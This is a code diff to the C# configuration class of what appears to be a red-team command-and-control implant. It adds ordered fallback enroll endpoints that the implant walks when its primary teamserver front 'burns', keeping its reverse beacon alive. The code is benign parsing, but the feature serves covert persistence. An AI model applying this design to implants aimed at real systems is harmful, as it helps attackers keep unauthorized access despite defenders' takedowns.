@@ -27,9 +27,20 @@ internal sealed class Config
     /// The host:port (or https URL) of the mTLS beacon endpoint (the gRPC
     /// Beacon.CheckIn stream). The implant opens a long-lived reverse connection
     /// here after enrolling (architecture.md Sec 5/8). When empty it is derived
-    /// from <see cref="EnrollURL"/>.
+    /// from <see cref="EnrollURL"/>. It pairs with the primary endpoint only;
+    /// every <see cref="FallbackEnrollURLs"/> entry derives its own beacon host.
     /// </summary>
     public string BeaconURL { get; set; } = string.Empty;
+
+    /// <summary>
+    /// The ordered fallback enroll endpoints baked in behind
+    /// <see cref="EnrollURL"/> (architecture.md Sec 8): when the primary burns,
+    /// the implant walks this list on failed check-ins instead of going silent.
+    /// Each entry is another front to the same teamserver, so the enrolled leaf
+    /// -- the identity the listener sees -- never changes across the walk. Empty
+    /// is the single-endpoint shape.
+    /// </summary>
+    public IReadOnlyList<string> FallbackEnrollURLs { get; set; } = Array.Empty<string>();
 
     /// <summary>The one-use secret the operator minted for the engagement.</summary>
     public string StagerToken { get; set; } = string.Empty;
@@ -92,14 +103,15 @@ internal sealed class Config
     public bool HasKillDate => KillDate != DateTimeOffset.MinValue;
 
     /// <summary>
-    /// Composes the enroll host (EnrollURL with any path stripped) and the
-    /// transport profile's enroll path, so a profiled implant enrolls against the
-    /// path it was baked with rather than the teamserver's default route.
+    /// Composes an egress entry's enroll host (the URL with any path stripped)
+    /// and the transport profile's enroll path, so a profiled implant enrolls
+    /// against the path it was baked with rather than the teamserver's default
+    /// route -- whichever entry of the egress walk is current.
     /// </summary>
-    public string ResolvedEnrollURL()
+    public static string ResolveEnrollUrl(string enrollUrl, TransportProfile transport)
     {
-        var host = EnrollURL;
-        var path = Transport.EnrollPath;
+        var host = enrollUrl;
+        var path = transport.EnrollPath;
         if (path.Length == 0)
             path = TransportProfile.DefaultEnrollPath;
 
@@ -134,6 +146,10 @@ internal sealed class Config
         {
             EnrollURL = Env("ROD_ENROLL_URL", string.Empty),
             BeaconURL = Env("ROD_BEACON_URL", string.Empty),
+            // The fallback list rides as a JSON array string -- the same shape
+            // the baked profile's "fallbackEnrollURLs" key carries, passed
+            // through verbatim by BakedProfileSupport.
+            FallbackEnrollURLs = ParseUrlListEnv(Env("ROD_FALLBACK_ENROLL_URLS", string.Empty)),
             StagerToken = Env("ROD_STAGER_TOKEN", string.Empty),
             Sleep = EnvTimeSpan("ROD_SLEEP", TimeSpan.FromSeconds(30)),
             Jitter = EnvTimeSpan("ROD_JITTER", TimeSpan.FromSeconds(10)),
@@ -151,7 +167,7 @@ internal sealed class Config
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
             Mode = NormalizeMode(Env("ROD_MODE", BeaconModes.Stream)),
-            ClassVerbs = ParseVerbList(Env("ROD_VERBS", string.Empty)),
+            ClassVerbs = ParseCommaList(Env("ROD_VERBS", string.Empty)),
         };
         var killDate = Env("ROD_KILL_DATE", string.Empty);
         if (killDate.Length > 0)
@@ -176,6 +192,10 @@ internal sealed class Config
                 case "-beacon-url":
                 case "--beacon-url":
                     config.BeaconURL = TakeValue(args, ref i, flag);
+                    break;
+                case "-fallback-enroll-urls":
+                case "--fallback-enroll-urls":
+                    config.FallbackEnrollURLs = ParseCommaList(TakeValue(args, ref i, flag));
                     break;
                 case "-token":
                 case "--token":
@@ -244,6 +264,9 @@ internal sealed class Config
 
           -enroll-url string   teamserver enroll endpoint (https://host:port/implants/enroll)
           -beacon-url string   teamserver mTLS beacon endpoint (host:port or https URL)
+          -fallback-enroll-urls strings
+                               ordered fallback enroll endpoints walked when the
+                               primary burns (comma-separated)
           -token string        stager token secret redeeming at enroll
           -sleep duration      beacon sleep interval (default 30s)
           -jitter duration     beacon jitter interval (default 10s)
@@ -267,14 +290,44 @@ internal sealed class Config
     private static string Env(string key, string fallback)
         => Environment.GetEnvironmentVariable(key) is { Length: > 0 } v ? v : fallback;
 
-    // Splits the comma-separated class verb list the bake emits ("a,b,c") into
-    // the individual verbs, trimming whitespace and dropping empties so a stray
-    // separator never registers a blank verb.
-    private static IReadOnlyList<string> ParseVerbList(string raw)
+    // Splits a comma-separated list ("a,b,c") into its items, trimming
+    // whitespace and dropping empties so a stray separator never registers a
+    // blank entry. Serves the class verb set and the fallback endpoint flag.
+    private static IReadOnlyList<string> ParseCommaList(string raw)
     {
         if (string.IsNullOrWhiteSpace(raw))
             return Array.Empty<string>();
         return raw.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);
+    }
+
+    // Decodes the ROD_FALLBACK_ENROLL_URLS value (a JSON array string, the same
+    // shape the baked profile's "fallbackEnrollURLs" key carries) into the
+    // ordered endpoint list. An empty or malformed value yields an empty list so
+    // a bad bake never breaks enroll.
+    private static IReadOnlyList<string> ParseUrlListEnv(string raw)
+    {
+        if (string.IsNullOrWhiteSpace(raw))
+            return Array.Empty<string>();
+        try
+        {
+            using var doc = System.Text.Json.JsonDocument.Parse(raw);
+            if (doc.RootElement.ValueKind != System.Text.Json.JsonValueKind.Array)
+                return Array.Empty<string>();
+            var urls = new List<string>();
+            foreach (var item in doc.RootElement.EnumerateArray())
+            {
+                if (item.ValueKind != System.Text.Json.JsonValueKind.String)
+                    continue;
+                var url = item.GetString();
+                if (!string.IsNullOrWhiteSpace(url))
+                    urls.Add(url.Trim());
+            }
+            return urls;
+        }
+        catch
+        {
+            return Array.Empty<string>();
+        }
     }
 
     private static TimeSpan EnvTimeSpan(string key, TimeSpan fallback)
